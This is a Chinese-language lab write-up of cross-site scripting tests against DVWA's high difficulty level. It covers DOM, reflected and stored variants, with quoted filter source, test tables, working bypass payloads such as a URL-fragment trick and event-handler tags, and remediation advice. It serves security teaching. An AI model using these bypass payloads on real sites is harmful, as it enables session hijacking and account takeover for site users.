XSS报告

## 漏洞概要

XSS（跨站脚本）是一类高危漏洞，存在于浏览器渲染页面的环境中，本质上是在数据与代码没有严格分离的环境下，将用户输入的内容作为HTML标签或JavaScript代码被浏览器解析执行。XSS漏洞常见于将用户输入直接输出到页面、未做上下文编码的场景。攻击者可通过XSS窃取用户Cookie实现会话劫持、以受害者身份执行操作、挂马钓鱼，存储型XSS更可用来攻击后台管理员。

XSS与SQL注入同源，都是"代码与数据没有分离"：SQL注入是数据库分不清SQL语句和数据，XSS是浏览器分不清页面标记和用户数据。区别只在于失守的层次——一个在数据库解析器，一个在浏览器解析器。

XSS按数据经过哪里分为三种：**反射型**的特点是数据经服务端响应立即回显，不落库，需要诱导受害者点击特制链接；**存储型**的特点是数据先落库，之后每次被访问都会触发，不需要诱导点击，危害最大，可用来打后台管理员；**DOM型**的特点是全程在前端完成，服务端不参与，数据被JavaScript从URL取出后写进危险函数（sink），如innerHTML、document.write、eval。

## 漏洞检测

0、寻找输入点

三个模块的输入点与简单/中等难度相同，**变的只是防护强度**：

- **DOM 型**：URL 参数 `default`
- **反射型**：表单字段 `name`
- **存储型**：两个字段 `txtName` 与 `mtxMessage`

1、判断输出点（数据回到了哪里）

**DOM 型**——服务端不参与，前端 JS 把数据写进 DOM：

```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
document.write("<option value='" + lang + "'>" + $decodeURI(lang) + "</option>");
```

**这一档的关键是"两个值不是同一个"**：

| 谁在用这个值 | 取的是什么 |
|---|---|
| 服务端白名单校验 | `$_GET['default']` —— 只有 `?` 之后的查询串 |
| 前端 sink | `document.location.href` —— **含 `#` 之后的 fragment** |

**反射型**——落在 `<pre>Hello 【数据】</pre>` 的 HTML 正文位置。

**存储型**——`<div id="guestbook_comments">Name: 【数据】<br />Message: 【数据】</div>`；输出函数 `dvwaGuestbook()` 在非 impossible 档**不做编码**。

2、检测闭合方式

三处落点都在 HTML 正文、无引号包裹，**无需跳出**，可直接构造完整标签。

**DOM 型另有一个限制**：`document.write` 拼接用的是 `lang`（URL 编码态），只有显示那一处用了 `decodeURI(lang)`——所以 URL 里的 `"` `'` 是 `%22` `%27`，**用引号破属性走不通**。

3、检测能否执行

**反射型与存储型**：换成不含 `s-c-r-i-p-t` 字母序列的标签即可执行（见第 4 项）。

**DOM 型**：`<script>` 与 `<img>` 走普通查询串时**都是 302 跳转**，说明服务端把它们拦掉了。执行的前提是**让服务端看不到这个参数**——见第 4 项。

4、检测过滤方式

### DOM 型（白名单 + 「两个值不一致」）

源码 `xss_d/source/high.php`：

```php
switch ($_GET['default']) {
    case "French":
    case "English":
    case "German":
    case "Spanish":
        break;
    default:
        header ("location: ?default=English");
        exit;
}
```

**这是白名单**——只放行四个固定值，其余一律 302。和前面几档"拦危险字符"的性质完全不同。

实测（难度已锁 high）：

| 尝试 | 结果 |
|---|---|
| `English` | 200 放行 |
| `<script>alert(1)</script>` | **302 被拒** |
| `<SCRIPT>` / `<sCript>`（大小写） | 302 被拒 |
| `<script >`（标签名后加空格） | 302 被拒 |
| `<scr<script>ipt>` 等三种双写 | 302 被拒 |
| `<img src=x onerror=alert(1)>` | **302 被拒** |
| `English%00<script>...`（00 截断） | 302 被拒 |
| `%00<script>...` | 302 被拒 |
| ` English`（前置空格）/ `english`（小写） | 302 被拒 |

**结论：白名单本身没有绕过空间。** 它不判断"输入里有没有危险字符"，而是判断"输入是不是等于那四个值之一"，攻击者的输入集合被压缩成 4 个常量。

**00 截断为什么无效**：`%00` 截断只对 PHP 的**文件系统函数**（`include`/`fopen` 等，且 PHP < 5.3.4）有效；`switch` 是长度明确的字符串比较，`\0` 只是一个普通字符。

**真正的绕过点在"服务端和前端取的值不同"**：

```
服务端校验：$_GET['default']          ← HTTP 请求只带 ? 后的查询串
前端 sink ：document.location.href    ← 含 # 之后的 fragment
```

**把 payload 放进 fragment**，服务端就收不到这个参数、白名单不触发；而前端读 `href` 时照样能拿到。

实测对照（同一 payload，两个位置）：

| payload 放哪 | 服务端收到吗 | 状态码 |
|---|---|---|
| `?default=<payload>` | 收到 | **302 跳转** |
| `#?default=<payload>` | **没收到** | **200，无跳转** |

**302 变 200，就是"fragment 没发给服务端"的硬证据。**

最终可用形式（浏览器实测弹窗成功）：

```
http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/#?default=%3Cimg%20src=x%20onerror=alert(1)%3E
```

**注意 fragment 里的内容需要编码**（`%3C` 而不是裸 `<`），因为浏览器会对地址栏里的非法字符自动编码，前端那句 `decodeURI` 再把它还原——**能还原的前提是这一档还保留着 `decodeURI`**（impossible 档把它去掉了，见下方对照）。

### 反射型（同一个正则）

源码 `xss_r/source/high.php`：

```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
```

**匹配条件**：先遇到 `<`，之后按顺序出现 `s` `c` `r` `i` `p` `t` 六个字母（中间可夹任意字符）。`/i` 忽略大小写，`(.*)` 贪婪。

**逐条实测，确认它到底删什么、不删什么**：

| 传入 | 回显 | 说明 |
|---|---|---|
| `<script>alert(1)</script>` | `>` | 从第一个 `<` 一路吃到最后一个 `t` |
| `<script>alert(1)` | `(1)` | 没闭合标签，吃到 `alert` 的 `t`，剩 `(1)` |
| `<script>alert` | （空） | 吃到最后的 `t`，什么都不剩 |
| `<script>` | `>` | 同上 |
| **`alert(1)`** | **`alert(1)`** | ★ **`alert` 没被过滤** |
| **`alert`** | **`alert`** | ★ 同上 |
| **`<abc>alert(1)</abc>`** | **原样** | ★ **不拦"标签"这个类别** |
| `<scriptx>alert(1)</scriptx>` | `x>` | 连 `scriptx` 也中招（同样含那六个字母序列） |
| `<foo>alert(1)</foo>` | 原样 | 名称里没有那六个字母，放过 |

**两条重要结论**：

1. **它不是关键字过滤**。`alert` 单独出现完好无损——之前看到"`alert` 也消失"是**贪婪匹配吃太多**造成的错觉。
2. **它不拦"标签"，只拦"含 s-c-r-i-p-t 字母序列的东西"**。

**所以绕过方式就是换一个不含该序列的标签**（实测全部原样保留）：

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

**注意 `<iframe src=javascript:...>` 和 `<a href=javascript:...>` 会被删**——不是因为标签危险，而是 `javascript` 这个词里含 `s-c-r-i-p-t`。

**另一条路线（换行拆开，钻正则的语法漏洞）**：PHP 正则里的 `.` **默认不匹配换行**，所以把六个字母拆到两行即可让匹配失败：

```
<scr\nipt>alert(1)</scr\nipt>
```

实测该写法**原样保留**（服务端没删）。**但浏览器能否把带换行的标签名当 `<script>` 解析，需要在浏览器中实测确认。**

### 存储型（两个字段防护不同）

源码 `xss_s/source/high.php`：

```php
// message 字段
$message = strip_tags( addslashes( $message ) );
$message = mysqli_real_escape_string(...);
$message = htmlspecialchars( $message );          // ← 有编码

// name 字段
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
$name = mysqli_real_escape_string(...);            // ← 没有 htmlspecialchars
```

**两个字段的防护完全不同**：

| 字段 | 防护 | 实测结果 |
|---|---|---|
| `mtxMessage` | `strip_tags` + `htmlspecialchars` | `<script>` 和 `<img>` **都被清掉**，绕不过 |
| `txtName` | 只有那个正则 + `mysqli_real_escape_string`（防 SQL 注入，不防 XSS） | `<img src=x onerror=alert(1)>` **完整落库** |

**name 字段实测**：

| 传入 | 留言区输出 | 结果 |
|---|---|---|
| `<script>alert(1)</script>` | `Name: >` | 被删 |
| **`<img src=x onerror=alert(1)>`** | **`Name: <img src=x onerror=alert(1)>`** | ★ 完整标签落库 |
| **`<svg onload=alert(1)>`** | **原样** | ★ 完整标签落库 |

**`mysqli_real_escape_string` 的作用是防 SQL 注入（转义引号），它对 XSS 毫无帮助**——标签不需要引号也能生效。

**存储型的危险在于第二处输出**：`dvwaGuestbook()` 从数据库读出来时**不做编码**（源码里只有 impossible 档才调 `htmlspecialchars`），所以落库的标签在**每次有人访问该页面时都会重新输出并执行**。

### 与 impossible 档的对照

同一条 fragment 路径，在 impossible 档失效，原因不在服务端过滤，而在前端把解码步骤去掉了：

```php
$decodeURI = "decodeURI";
if ($vulnerabilityFile == 'impossible.php') {
    $decodeURI = "";              // 只有 impossible 档不做解码
}
```

```
high       ：fragment 里的 %3Cscript%3E → decodeURI 还原成 <script> → 执行
impossible ：不做解码 → 拼进去的仍是 %3Cscript%3E 这串文本 → 不执行
```

**这也是为什么"fragment 绕过"必须依赖编码**：浏览器会把地址栏里的 `<` 转成 `%3C`，能还原成标签的唯一环节就是那句 `decodeURI`。

5、检测XSS类型

| 判断依据 | 结论 |
|---|---|
| 只在该次响应里回显，换个页面就没了 | 反射型 |
| 提交后内容留在页面上，**换个浏览器访问也触发** | 存储型 |
| 服务端无回显，JS 从 URL 取值写进 sink | DOM 型 |

本关三个模块在高等难度下**都被攻破**，各自路径不同：

- **DOM 型**：从发现状态码 302 开始，转而检查请求/响应，确认是**白名单拒绝**；再对比"服务端校验的值"与"前端读取的值"，用 **fragment** 让两者不一致
- **反射型**：从回显缺失的位置反推出**过滤的是 s-c-r-i-p-t 字母序列**，换标签绕过
- **存储型**：从两个字段的**回显差异**（`Name:` 与 `Message:` 表现不同）反推出两处防护不同，选弱的那个（`name`）打

**验证存储型仍须换浏览器（或隐私窗口）访问**，才能证明"别人访问也会中招"。

## 打靶练习

### 【DOM高等难度】

![image-20261001225720357](images/image-20261001225720357.png)

从URL结构可以看出default是参数，将参数改为输入<script>alert(1)</script>测试xss漏洞

![image-20261001230237095](images/image-20261001230237095.png)

提交表单后页面自动回到了参数修改前的URL

![image-20261002114631816](images/image-20261002114631816.png)

查看devtools的network可以看到，刚刚的URL返回页面状态为302重定向，所以没有生效<script>alert(1)</script>

![image-20261002123938040](images/image-20261002123938040.png)

查看devtools的network，响应内容是

HTTP/1.1 302 Found Date: Thu, 01 Oct 2026 17:48:44 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache **location: ?default=English** Content-Length: 146 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html

可以看到被重定向的参数为?default=English

写成URL的形式[Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*](http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/?default=English)

这就是刚刚看到的页面

![image-20261002155309066](images/image-20261002155309066.png)

<SCRIPT>alert(1)</SCRIPT>尝试大写script，返回页面重定向

![image-20261002155706676](images/image-20261002155706676.png)

<sCript>alert(1)</sCript>尝试其他大小写组合，返回页面重定向

![image-20261002155758570](images/image-20261002155758570.png)

<script >alert(1)</script >尝试加入空格绕过，返回页面重定向

![image-20261002160108955](images/image-20261002160108955.png)

考虑到可能是通过匹配删除的方式过滤，尝试

`<scr<script>ipt>alert(1)</script>`

`<scri<script>pt>alert(1)</script>`

`<script<script>>alert(1)</script>`

全部返回页面重定向

![image-20261002160446214](images/image-20261002160446214.png)

初步判断script被多种条件过滤，换用<img src=x onerror=alert(1)>写入default

![image-20261004010946229](images/image-20261004010946229.png)

返回页面重定向，尝试从解析规则入手

![image-20261004011203668](images/image-20261004011203668.png)

URL：http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/#?default=%3Cimg%20src=x%20onerror=alert(1)%3E

![image-20261004011228727](images/image-20261004011228727.png)

返回弹窗，验证漏洞存在。

### 【反射型高等难度】

![image-20261001230101602](images/image-20261001230101602.png)

页面上存在文本框，输入<script>alert(1)</script>测试漏洞

![image-20261004011609065](images/image-20261004011609065.png)

返回Hello >

![image-20261004011840686](images/image-20261004011840686.png)

测试<script>alert(1)，返回Hello (1)

![image-20261004012007177](images/image-20261004012007177.png)

测试<script>alert，返回Hello

![image-20261004012035906](images/image-20261004012035906.png)测试<script>，返回Hello >

可以得到几点信息：

1、防护方式为黑名单过滤

2、过滤方式为匹配删除

![image-20261004015742983](images/image-20261004015742983.png)

输入<img src=x onerror=alert(1)>

![image-20261004015808933](images/image-20261004015808933.png)

返回弹窗，验证漏洞存在

### 【存储型高等难度】

![image-20261004020112923](images/image-20261004020112923.png)

同时测试两个字段<script>alert(1)</script>

![image-20261004020142637](images/image-20261004020142637.png)

返回

Name: >
Message: alert(1)

![image-20261004020236817](images/image-20261004020236817.png)

测试大小写组合<scRipt>alert(1)</script>

![image-20261004020308313](images/image-20261004020308313.png)

返回

Name: >
Message: alert(1)

![image-20261004020401758](images/image-20261004020401758.png)

测试<img src=x onerror=alert(1)>

![image-20261004020421728](images/image-20261004020421728.png)

页面返回弹窗，验证漏洞存在。

## 总结

### 一、影响与危害

技术上能做**四类**事：窃取 Cookie 实现会话劫持（前提是 Cookie 未设 HttpOnly）、以受害者身份执行操作、挂马与钓鱼、页面篡改。**存储型还能打后台管理员**——管理员一打开留言管理页面就执行攻击者的脚本，等于间接拿下后台。

**本次已实际验证**：DVWA 三个 XSS 模块在**高等难度下全部被攻破**：

| 模块 | 高等难度的防护 | 绕过路径 | 结果 |
|---|---|---|---|
| **DOM 型** | 服务端白名单（只放行 4 个语言值） | 把 payload 放进 `#` 之后的 fragment，服务端收不到参数 | **弹窗** |
| **反射型** | `preg_replace` 删含 s-c-r-i-p-t 字母序列的内容 | 换 `<img src=x onerror=alert(1)>`（含该序列则被删，不含则原样） | **弹窗** |
| **存储型** | `message` 走 `strip_tags`+`htmlspecialchars`；`name` 只有那个正则 | **打 name 字段**，payload 完整落库 | **弹窗，且落库持久生效** |

**本关最值钱的两条发现**：

**① DOM 型的问题不在"规则不严"，而在"两处读的不是同一个值"。**

```
服务端白名单校验的内容：$_GET['default']        ← HTTP 请求只有 ? 后面的查询串
前端漏洞代码读取的内容：document.location.href   ← 含 # 之后的 fragment
```

fragment 永远不发给服务端，所以**把 payload 放进 `#` 之后，白名单根本没机会执行**。实测同一 payload 放查询串是 302 被拒、放 fragment 是 200 放行。

**白名单本身没有绕过空间**（大小写、换标签、00 截断、前置空格、重复参数五种写法均实测为 302），**绕过点在于"校验与使用不一致"这个结构性问题**。

**② 同一页面两个字段的防护强度差一个级别。**

```
message 字段（多行文本框）→ strip_tags + htmlspecialchars  → 真的防住了
name    字段（用户名）    → 一个只拦 s-c-r-i-p-t 的正则     → 等于没防
```

开发者对文本域做对了，对用户名只是"看起来做了"——加了正则、加了 `mysqli_real_escape_string`（那是防 SQL 注入的），**对 XSS 没有实际作用**。

**对业务意味着什么**：

1. **三档全部可绕**。开发者已经把"过滤"做到这一档能做的最好了（白名单、忽略大小写、贪婪匹配），**仍然全部失守**——说明"加过滤"这条路线本身有上限。
2. **存储型落库后持久生效**。留言写进 `guestbook` 表后，**每个访问该页面的人都会执行**，包括管理员。若后台有查看留言的入口，等于间接控制后台。
3. **DOM 型的 payload 不出现在服务端日志里**（参数只被前端 JS 读取、且藏在 fragment 里），**服务端侧的日志、WAF、白名单全部看不到它**。

**利用门槛**：

- **DOM 型 / 反射型**：需要诱导受害者点击一条特制链接，链接可伪装成短链或二维码。**DOM 型的 payload 藏在 fragment 里，服务端日志不会记录，事后追溯困难**
- **存储型**：**不需要任何诱导动作**——payload 落库后，只要有人访问留言页面就触发。这是它危害更大的根本原因

### 二、修复建议

1、根本修复：
   按输出上下文编码，而不是"统一转义一遍"。原理是让用户数据以**文本**身份
   进入解析器，而不是以**标记**身份。不同位置的编码方式不同：

   - HTML正文  → HTML实体编码（`<` → `&lt;`）
   - HTML属性  → 属性值加引号 + HTML实体编码（含 `"` 和 `'`）
   - JS字符串  → JS转义（不能只做HTML实体编码）
   - URL参数   → URL编码

   PHP里对应 `htmlspecialchars($x, ENT_QUOTES, 'UTF-8')`，
   注意必须带 `ENT_QUOTES`——只转义双引号不转义单引号，
   属性用单引号包裹时仍可越出。

2、为什么不能用转义/过滤替代：
   禁了 `<script>` 还有 `<img onerror>`、`<svg onload>`、`<details open ontoggle>`，
   黑名单永远列不全。与SQL注入的结论完全一致：这是"堵"而不是"隔离"。

3、临时缓解（代码改不动时）：
   - Cookie加 `HttpOnly`，让JS读不到Cookie，即便XSS成立也偷不走会话
   - 配CSP限制脚本来源、禁止内联脚本
   - 敏感操作加二次验证
   - 限制输入长度（只能挡住长payload，挡不住 `<svg onload=alert(1)>`，只能算辅助）

4、同类问题排查：
   按"用户输入在哪里被输出"对全部页面做一次检索，重点检查：
   - 所有搜索/留言/资料类的回显点
   - 后台管理页面（存储型XSS最常打的地方）
   - 请求头被记录并回显的位置（User-Agent、Referer 记进库后在后台展示）
   - 前端JS里的DOM sink

5、修复验证方法：
   用原 payload 复测：**三个模块分别用各自的绕过写法**。
   预期：源码里 `<` 变成 `&lt;`，页面显示为文本，不执行。

   **本关三档各自该复测什么**（针对性验证）：

   | 模块 | 复测 payload / 方式 | 预期 |
   |---|---|---|
   | **DOM 型** | `#?default=%3Cimg%20src=x%20onerror=alert(1)%3E`（fragment 形式） | 不再 302，但也**不再弹窗**；fragment 里的内容被当纯文本 |
   | 反射型 | `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>` | 全部被编码为 `&lt;img...` 文本输出 |
   | 反射型 | `<scr\nipt>alert(1)</scr\nipt>`（换行拆开） | 同样被编码输出 |
   | 存储型 | 用 `<img src=x onerror=alert(1)>` 打 **name** 字段，然后**换浏览器访问留言页** | 显示为文本，不执行 |

   并需更换上下文复测（只改一处编码不算修好）：
   - 属性上下文：`" onmouseover=alert(1) x="`，预期引号被编码成 `&quot;`
   - 单引号属性：`' onmouseover=alert(1) x='`，预期 `'` 被编码成 `&#39;`
     （这一条专门验证 `ENT_QUOTES` 是否生效）
   - JS字符串内：`';alert(1);//`，预期引号被转义

   并需更换标签复测，确认黑名单不是唯一防线：
   `<img src=1 onerror=alert(1)>`、`<svg onload=alert(1)>`、`<details open ontoggle=alert(1)>`
   预期：全部被编码输出，无一执行。

   **本关最重要的验证项是 DOM 型**：它的绕过不依赖"payload 能不能过过滤"，
   而是依赖"服务端和前端读的值不一致"。所以修复后必须**专门用 fragment 形式复测**——
   只把白名单写严、或者只加服务端过滤，都挡不住这条路。

### 三、延伸思考

**卡在哪**：

1、**DOM 型一开始判断成"白名单绕不过"，方向错了。**

   把 `<script>`、`<SCRIPT>`、`<sCript>`、`<script >`（加空格）、双写的三种写法、`<img>`、`00 截断`、前置空格、重复参数——
   **全部 302 被拒**。于是得出"白名单没有绕过空间"的结论。

   问题在于只验证了"**服务端会不会拒**"，没有验证"**服务端和前端读的是不是同一个值**"。
   这关的白名单校验的是 `$_GET['default']`（只有查询串），而漏洞代码读的是 `document.location.href`（含 fragment）。
   **把 payload 放进 `#` 之后**，服务端收不到参数、白名单不触发，前端照样能读到。

   **这一步的转折是**：从"想办法让 payload 过过滤"换成"让过滤根本看不到这个参数"。
   **这是两类完全不同的问题**，容易混成同一类。

2、**反射型一度误判成"也在过滤 `alert`"。**

   实测记录是：`<script>alert(1)</script>` → `>`，`<script>alert` → 空。
   看起来像"`alert` 也被删了"。后来单独测 `alert(1)` 和 `alert`，**两个都完整保留**，
   才明白不是关键字过滤——是**贪婪匹配 `(.*)` 吃太多**：
   从第一个 `<` 一路吃到最后一个 `t`，如果 payload 尾部还有 `t`（比如 `alert` 的 `t`），就会被一起吃掉。

   **"某个词消失了"不等于"这个词被过滤"**，要看它在不触发过滤结构时是否还消失。

3、**存储型卡在 message 字段，是找错了字段。**

   两个字段都提交 `<script>alert(1)</script>`，回显是
   `Name: >` 和 `Message: alert(1)`——**两边的表现不一样**。
   当时没有留意这个差异，继续在 message 字段上尝试各种写法，全部失败。

   后来读源码才发现两个字段的防护不同：message 走 `strip_tags`（解析型，删所有标签），
   name 只有一个拦 s-c-r-i-p-t 的正则。改用 name 字段后**第一次提交就成功了**。

   **回显的差异本身就是线索**——两个字段对同一个 payload 给出不同反应，说明它们的处理逻辑不同。

**学到什么**：

1、**"校验的值"和"使用的值"必须比对，这是很容易漏检的一类。**

   常规思路是"看它怎么过滤，然后绕过过滤"，但这关的问题是：
   **校验在一处、使用在另一处，而两处的数据来源不同。**

   ```
   服务端校验：$_GET['default']         ← 只有 ? 后的查询串
   前端使用  ：document.location.href   ← 含 # 后的 fragment
   ```

   **fragment 是这两者的差集**——服务端永远看不到，前端永远看得到。

   **推广到其它场景**：凡是"校验在一处、使用在另一处"的地方都值得查——
   WAF 校验原始请求体、后端解码后再使用；校验 URL 参数、使用 HTTP 头；校验前端传入的 ID、实际用会话里的 ID。

2、**状态码是第一个要看、也最容易看漏的信号。**

   ```
   302 / 403  → 请求被【拒绝】→ 响应体里没有 payload，只能靠变体倒推规则
   200        → 请求被【正常处理】→ 才去看响应体 / DOM
   ```

   本关 DOM 型是 302、反射型和存储型是 200，**两类情况的后续动作完全不同**：302 时翻响应体找不到 payload，只有 200 才需要比较"传入 vs 回显"。

3、**过滤的正则要"读它的匹配条件"，而不是"试它的结果"。**

   ```php
   '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'
   ```

   读懂了就知道：**匹配条件是"`<` 之后按顺序出现 s-c-r-i-p-t 六个字母"**。
   由此可以直接推出——`<img>` 里没有这个序列，能过；`<iframe src=javascript:>` 里 `javascript` 含 `script`，被删。
   **不用一个个 payload 试**，规则读懂了就能预测。

   另外两个细节也要读出来：`/i` 说明大小写无效；`.` 不匹配换行说明可以拆行绕过。

4、**"过滤"和"编码"是两种东西，防护强度差一个级别。**

   | 字段 | 处理 | 性质 | 结果 |
   |---|---|---|---|
   | message | `strip_tags` + `htmlspecialchars` | **解析型 + 编码** | 绕不过 |
   | name | `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i')` | **黑名单** | 换标签即绕 |

   同一个页面、同一个难度，两个字段差一个级别。**这也是"从最弱的口子进"的典型场景**——
   不要在防护最强的地方死磕。

5、**`mysqli_real_escape_string` 防的是 SQL 注入，不是 XSS。**

   name 字段这行代码很容易让人误以为"做了防护"：

   ```php
   $name = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name);
   ```

   它转义的是引号（防止闭合 SQL 语句），**而 XSS 标签不需要引号就能生效**：
   `<img src=x onerror=alert(1)>` 里一个引号都没有，照样执行。
   **判断防护有没有用，要看它针对的是哪一类威胁。**
